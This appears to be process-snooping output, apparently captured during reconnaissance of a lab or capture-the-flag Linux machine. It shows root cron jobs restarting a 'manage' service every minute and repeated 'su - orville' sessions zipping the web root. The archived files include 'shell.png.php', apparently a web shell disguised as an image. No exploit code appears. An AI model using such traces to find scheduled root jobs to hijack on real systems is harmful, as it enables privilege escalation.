+2025/01/16 12:23:13 [34;1mCMD: UID=0     PID=13037  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:23:13 [34;1mCMD: UID=0     PID=13038  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:23:13 [34;1mCMD: UID=0     PID=13039  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:23:13 [34;1mCMD: UID=0     PID=13040  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:23:14 [34;1mCMD: UID=0     PID=13045  | cat /var/lib/update-notifier/hwe-eol [0m
+2025/01/16 12:23:14 [34;1mCMD: UID=0     PID=13051  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:23:14 [34;1mCMD: UID=0     PID=13054  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:23:14 [34;1mCMD: UID=0     PID=13059  | sshd: root@pts/2     [0m
+2025/01/16 12:23:14 [34;1mCMD: UID=0     PID=13060  | -bash [0m
+2025/01/16 12:23:15 [34;1mCMD: UID=0     PID=13064  | -bash [0m
+2025/01/16 12:23:15 [34;1mCMD: UID=0     PID=13065  | /bin/sh /usr/bin/lesspipe [0m
+2025/01/16 12:23:15 [34;1mCMD: UID=0     PID=13069  | -bash [0m
+2025/01/16 12:23:15 [34;1mCMD: UID=0     PID=13070  | -bash [0m
+2025/01/16 12:23:15 [32;1mCMD: UID=1003  PID=13071  | su - orville [0m
+2025/01/16 12:23:15 [32;1mCMD: UID=1003  PID=13075  | -bash [0m
+2025/01/16 12:23:15 [32;1mCMD: UID=1003  PID=13074  | -bash [0m
+2025/01/16 12:23:16 [32;1mCMD: UID=1003  PID=13076  | -bash [0m
+2025/01/16 12:23:16 [32;1mCMD: UID=1003  PID=13080  | dircolors -b [0m
+2025/01/16 12:23:17 [32;1mCMD: UID=1003  PID=13081  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:23:22 [32;1mCMD: UID=1003  PID=13082  | chmod 700 /home/orville/web_snapshot.zip [0m
+2025/01/16 12:23:29 [34;1mCMD: UID=0     PID=13083  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:29 [34;1mCMD: UID=0     PID=13085  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:29 [34;1mCMD: UID=0     PID=13084  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:30 [34;1mCMD: UID=0     PID=13092  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:30 [34;1mCMD: UID=0     PID=13091  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:30 [34;1mCMD: UID=0     PID=13090  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:30 [34;1mCMD: UID=0     PID=13089  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:30 [34;1mCMD: UID=0     PID=13088  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:30 [34;1mCMD: UID=0     PID=13087  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:30 [34;1mCMD: UID=0     PID=13086  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:40 [34;1mCMD: UID=0     PID=13096  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:40 [34;1mCMD: UID=0     PID=13095  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:40 [34;1mCMD: UID=0     PID=13094  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:40 [34;1mCMD: UID=0     PID=13093  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:40 [34;1mCMD: UID=0     PID=13097  | (time-dir) [0m
+2025/01/16 12:23:40 [34;1mCMD: UID=0     PID=13098  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:40 [34;1mCMD: UID=0     PID=13101  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:40 [34;1mCMD: UID=0     PID=13100  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:40 [34;1mCMD: UID=0     PID=13099  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:41 [34;1mCMD: UID=0     PID=13103  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:41 [34;1mCMD: UID=0     PID=13102  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:01 [34;1mCMD: UID=0     PID=13104  | /usr/sbin/CRON -f [0m
+2025/01/16 12:24:01 [34;1mCMD: UID=0     PID=13106  | systemctl restart manage [0m
+2025/01/16 12:24:01 [34;1mCMD: UID=0     PID=13105  | /bin/sh -c systemctl restart manage [0m
+2025/01/16 12:24:01 [34;1mCMD: UID=0     PID=13107  | /sbin/init [0m
+2025/01/16 12:24:01 [34;1mCMD: UID=0     PID=13110  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:01 [34;1mCMD: UID=0     PID=13109  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:01 [34;1mCMD: UID=0     PID=13108  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:02 [34;1mCMD: UID=0     PID=13111  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:05 [34;1mCMD: UID=0     PID=13112  | /usr/sbin/sshd -D -R [0m
+2025/01/16 12:24:05 [34;1mCMD: UID=109   PID=13115  | sshd: [net]          [0m
+2025/01/16 12:24:06 [34;1mCMD: UID=0     PID=13120  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:06 [34;1mCMD: UID=0     PID=13119  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:06 [34;1mCMD: UID=0     PID=13118  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:06 [34;1mCMD: UID=0     PID=13117  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:06 [34;1mCMD: UID=0     PID=13116  | /lib/systemd/systemd-user-runtime-dir start 0 [0m
+2025/01/16 12:24:06 [34;1mCMD: UID=0     PID=13122  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:06 [34;1mCMD: UID=0     PID=13121  | /sbin/init [0m
+2025/01/16 12:24:07 [34;1mCMD: UID=0     PID=13123  | (sd-pam) [0m
+2025/01/16 12:24:07 [34;1mCMD: UID=0     PID=13124  | (sd-executor) [0m
+2025/01/16 12:24:07 [34;1mCMD: UID=0     PID=13125  | /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator [0m
+2025/01/16 12:24:07 [34;1mCMD: UID=0     PID=13126  | (sd-executor) [0m
+2025/01/16 12:24:08 [34;1mCMD: UID=0     PID=13127  | (ystemctl) [0m
+2025/01/16 12:24:08 [34;1mCMD: UID=0     PID=13128  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:09 [34;1mCMD: UID=0     PID=13130  | /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:24:09 [34;1mCMD: UID=0     PID=13129  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:24:09 [34;1mCMD: UID=0     PID=13131  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:24:09 [34;1mCMD: UID=0     PID=13135  | /bin/sh /etc/update-motd.d/10-help-text [0m
+2025/01/16 12:24:09 [34;1mCMD: UID=0     PID=13137  | grep -c ^processor /proc/cpuinfo [0m
+2025/01/16 12:24:09 [34;1mCMD: UID=0     PID=13136  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:24:09 [36;1mCMD: UID=???   PID=13151  | ???[0m
+2025/01/16 12:24:09 [36;1mCMD: UID=???   PID=13150  | ???[0m
+2025/01/16 12:24:09 [34;1mCMD: UID=0     PID=13148  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:24:09 [34;1mCMD: UID=0     PID=13152  | [0m
+2025/01/16 12:24:09 [34;1mCMD: UID=0     PID=13153  | /bin/sh /usr/share/update-notifier/notify-updates-outdated [0m
+2025/01/16 12:24:10 [34;1mCMD: UID=0     PID=13159  | cut -d  -f4 [0m
+2025/01/16 12:24:10 [34;1mCMD: UID=0     PID=13158  | /usr/bin/python3 -Es /usr/bin/lsb_release -sd [0m
+2025/01/16 12:24:10 [34;1mCMD: UID=0     PID=13157  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:24:10 [34;1mCMD: UID=0     PID=13156  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:24:11 [36;1mCMD: UID=???   PID=13162  | ???[0m
+2025/01/16 12:24:11 [34;1mCMD: UID=0     PID=13163  | expr 1737025362 + 86400 [0m
+2025/01/16 12:24:11 [34;1mCMD: UID=0     PID=13167  | systemd-detect-virt -q -c [0m
+2025/01/16 12:24:11 [34;1mCMD: UID=0     PID=13166  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:24:11 [34;1mCMD: UID=0     PID=13168  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:24:11 [34;1mCMD: UID=0     PID=13169  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:24:11 [34;1mCMD: UID=0     PID=13170  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:24:11 [34;1mCMD: UID=0     PID=13172  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:24:11 [34;1mCMD: UID=0     PID=13173  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:24:11 [34;1mCMD: UID=0     PID=13175  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:24:11 [34;1mCMD: UID=0     PID=13174  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13176  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13177  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13179  | id -u [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13181  | [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13180  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13182  | [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13184  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13187  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13186  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13185  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13188  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13189  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:24:12 [34;1mCMD: UID=0     PID=13196  | sshd: root@pts/2     [0m
+2025/01/16 12:24:13 [34;1mCMD: UID=0     PID=13201  | -bash [0m
+2025/01/16 12:24:13 [34;1mCMD: UID=0     PID=13202  | /bin/sh /usr/bin/lesspipe [0m
+2025/01/16 12:24:13 [34;1mCMD: UID=0     PID=13206  | -bash [0m
+2025/01/16 12:24:13 [34;1mCMD: UID=0     PID=13207  | -bash [0m
+2025/01/16 12:24:13 [32;1mCMD: UID=1003  PID=13208  | su - orville [0m
+2025/01/16 12:24:14 [32;1mCMD: UID=1003  PID=13210  | /usr/bin/locale-check C.UTF-8 [0m
+2025/01/16 12:24:14 [32;1mCMD: UID=1003  PID=13212  | -bash [0m
+2025/01/16 12:24:14 [32;1mCMD: UID=1003  PID=13211  | -bash [0m
+2025/01/16 12:24:14 [32;1mCMD: UID=1003  PID=13213  | -bash [0m
+2025/01/16 12:24:15 [32;1mCMD: UID=1003  PID=13218  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:24:20 [32;1mCMD: UID=1003  PID=13219  | [0m
+2025/01/16 12:24:28 [34;1mCMD: UID=0     PID=13229  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:28 [34;1mCMD: UID=0     PID=13228  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:28 [34;1mCMD: UID=0     PID=13227  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:28 [34;1mCMD: UID=0     PID=13226  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:28 [34;1mCMD: UID=0     PID=13225  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:28 [34;1mCMD: UID=0     PID=13224  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:28 [34;1mCMD: UID=0     PID=13223  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:28 [34;1mCMD: UID=0     PID=13222  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:28 [34;1mCMD: UID=0     PID=13221  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:28 [34;1mCMD: UID=0     PID=13220  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:38 [34;1mCMD: UID=0     PID=13239  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:38 [34;1mCMD: UID=0     PID=13238  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:38 [34;1mCMD: UID=0     PID=13237  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:38 [34;1mCMD: UID=0     PID=13236  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:38 [34;1mCMD: UID=0     PID=13235  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:38 [34;1mCMD: UID=0     PID=13234  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:38 [34;1mCMD: UID=0     PID=13233  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:38 [34;1mCMD: UID=0     PID=13232  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:38 [34;1mCMD: UID=0     PID=13231  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:38 [34;1mCMD: UID=0     PID=13230  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:24:38 [34;1mCMD: UID=0     PID=13240  | /sbin/init [0m
+2025/01/16 12:25:01 [34;1mCMD: UID=0     PID=13241  | /usr/sbin/CRON -f [0m
+2025/01/16 12:25:01 [34;1mCMD: UID=0     PID=13243  | systemctl restart manage [0m
+2025/01/16 12:25:01 [34;1mCMD: UID=0     PID=13242  | /bin/sh -c systemctl restart manage [0m
+2025/01/16 12:25:02 [34;1mCMD: UID=0     PID=13244  | /sbin/init [0m
+2025/01/16 12:25:02 [34;1mCMD: UID=0     PID=13253  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:02 [34;1mCMD: UID=0     PID=13252  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:02 [34;1mCMD: UID=0     PID=13251  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:02 [34;1mCMD: UID=0     PID=13250  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:02 [34;1mCMD: UID=0     PID=13249  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:02 [34;1mCMD: UID=0     PID=13248  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:02 [34;1mCMD: UID=0     PID=13247  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:02 [34;1mCMD: UID=0     PID=13246  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:02 [34;1mCMD: UID=0     PID=13245  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:02 [34;1mCMD: UID=0     PID=13254  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:05 [34;1mCMD: UID=0     PID=13256  | /usr/sbin/sshd -D -R [0m
+2025/01/16 12:25:06 [34;1mCMD: UID=109   PID=13258  | sshd: [net]          [0m
+2025/01/16 12:25:07 [34;1mCMD: UID=0     PID=13259  | /lib/systemd/systemd-user-runtime-dir start 0 [0m
+2025/01/16 12:25:07 [34;1mCMD: UID=0     PID=13260  | (systemd) [0m
+2025/01/16 12:25:07 [34;1mCMD: UID=0     PID=13261  | (sd-pam) [0m
+2025/01/16 12:25:07 [34;1mCMD: UID=0     PID=13262  | (sd-executor) [0m
+2025/01/16 12:25:07 [34;1mCMD: UID=0     PID=13263  | /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator [0m
+2025/01/16 12:25:09 [34;1mCMD: UID=0     PID=13265  | /lib/systemd/systemd --user [0m
+2025/01/16 12:25:09 [34;1mCMD: UID=0     PID=13268  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:25:09 [34;1mCMD: UID=0     PID=13267  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:25:09 [34;1mCMD: UID=0     PID=13266  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:25:09 [34;1mCMD: UID=0     PID=13269  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:25:09 [34;1mCMD: UID=0     PID=13270  | [0m
+2025/01/16 12:25:09 [34;1mCMD: UID=0     PID=13271  | uname -m [0m
+2025/01/16 12:25:09 [34;1mCMD: UID=0     PID=13273  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13277  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13276  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13275  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13278  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13283  | cut -c -80 [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13282  | tr -d \000-\011\013\014\016-\037 [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13281  | head -n 10 [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13280  | cat /var/cache/motd-news [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13279  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13296  | cut -d  -f4 [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13295  | /usr/bin/python3 -Es /usr/bin/lsb_release -sd [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13294  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:25:10 [34;1mCMD: UID=0     PID=13293  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:25:11 [34;1mCMD: UID=0     PID=13301  | [0m
+2025/01/16 12:25:11 [34;1mCMD: UID=0     PID=13302  | /bin/sh /etc/update-motd.d/92-unattended-upgrades [0m
+2025/01/16 12:25:11 [34;1mCMD: UID=0     PID=13303  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:25:11 [34;1mCMD: UID=0     PID=13304  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:25:11 [34;1mCMD: UID=0     PID=13305  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:25:11 [34;1mCMD: UID=0     PID=13306  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:25:11 [34;1mCMD: UID=0     PID=13308  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:25:11 [34;1mCMD: UID=0     PID=13307  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13309  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13311  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13312  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13313  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13314  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13316  | id -u [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13318  | [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13317  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13319  | [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13320  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:25:12 [36;1mCMD: UID=???   PID=13322  | ???[0m
+2025/01/16 12:25:12 [36;1mCMD: UID=???   PID=13321  | ???[0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13330  | [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13325  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:25:12 [34;1mCMD: UID=0     PID=13331  | cat /var/lib/update-notifier/fsck-at-reboot [0m
+2025/01/16 12:25:13 [34;1mCMD: UID=0     PID=13333  | sshd: root@pts/2     [0m
+2025/01/16 12:25:13 [34;1mCMD: UID=0     PID=13334  | -bash [0m
+2025/01/16 12:25:13 [36;1mCMD: UID=???   PID=13338  | ???[0m
+2025/01/16 12:25:13 [34;1mCMD: UID=0     PID=13342  | dircolors -b [0m
+2025/01/16 12:25:13 [34;1mCMD: UID=0     PID=13344  | su - orville [0m
+2025/01/16 12:25:13 [32;1mCMD: UID=1003  PID=13345  | -bash [0m
+2025/01/16 12:25:14 [32;1mCMD: UID=1003  PID=13350  | -bash [0m
+2025/01/16 12:25:14 [32;1mCMD: UID=1003  PID=13354  | dircolors -b [0m
+2025/01/16 12:25:15 [32;1mCMD: UID=1003  PID=13355  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:25:21 [32;1mCMD: UID=1003  PID=13356  | [0m
+2025/01/16 12:25:28 [34;1mCMD: UID=0     PID=13357  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:28 [34;1mCMD: UID=0     PID=13366  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:28 [34;1mCMD: UID=0     PID=13365  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:28 [34;1mCMD: UID=0     PID=13364  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:28 [34;1mCMD: UID=0     PID=13363  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:28 [34;1mCMD: UID=0     PID=13362  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:28 [34;1mCMD: UID=0     PID=13361  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:28 [34;1mCMD: UID=0     PID=13360  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:28 [34;1mCMD: UID=0     PID=13359  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:28 [34;1mCMD: UID=0     PID=13358  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:38 [34;1mCMD: UID=0     PID=13371  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:38 [34;1mCMD: UID=0     PID=13370  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:38 [34;1mCMD: UID=0     PID=13369  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:38 [34;1mCMD: UID=0     PID=13368  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:38 [34;1mCMD: UID=0     PID=13367  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:38 [34;1mCMD: UID=0     PID=13372  | /lib/systemd/systemd-user-runtime-dir stop 0 [0m
+2025/01/16 12:25:39 [34;1mCMD: UID=0     PID=13377  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:39 [34;1mCMD: UID=0     PID=13376  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:39 [34;1mCMD: UID=0     PID=13375  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:39 [34;1mCMD: UID=0     PID=13374  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:25:39 [34;1mCMD: UID=0     PID=13373  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13378  | /usr/sbin/CRON -f [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13379  | /usr/sbin/CRON -f [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13380  | systemctl restart manage [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13381  | /sbin/init [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13382  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13383  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13390  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13389  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13388  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13387  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13386  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13385  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:01 [34;1mCMD: UID=0     PID=13384  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:05 [34;1mCMD: UID=0     PID=13391  | /usr/sbin/sshd -D -R [0m
+2025/01/16 12:26:05 [34;1mCMD: UID=109   PID=13394  | sshd: [net]          [0m
+2025/01/16 12:26:06 [34;1mCMD: UID=0     PID=13397  | (time-dir) [0m
+2025/01/16 12:26:06 [34;1mCMD: UID=0     PID=13398  | (systemd) [0m
+2025/01/16 12:26:07 [34;1mCMD: UID=0     PID=13399  | (sd-pam) [0m
+2025/01/16 12:26:07 [34;1mCMD: UID=0     PID=13400  | (sd-executor) [0m
+2025/01/16 12:26:07 [34;1mCMD: UID=0     PID=13401  | (sd-executor) [0m
+2025/01/16 12:26:07 [34;1mCMD: UID=0     PID=13403  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:08 [34;1mCMD: UID=0     PID=13404  | /lib/systemd/systemd --user [0m
+2025/01/16 12:26:08 [34;1mCMD: UID=0     PID=13406  | [0m
+2025/01/16 12:26:08 [34;1mCMD: UID=0     PID=13405  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13407  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13408  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13422  | cut -c -80 [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13421  | tr -d \000-\011\013\014\016-\037 [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13420  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13419  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13418  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13423  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13424  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13430  | [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13428  | /bin/sh /usr/share/update-notifier/notify-updates-outdated [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13431  | /bin/sh /etc/update-motd.d/91-contract-ua-esm-status [0m
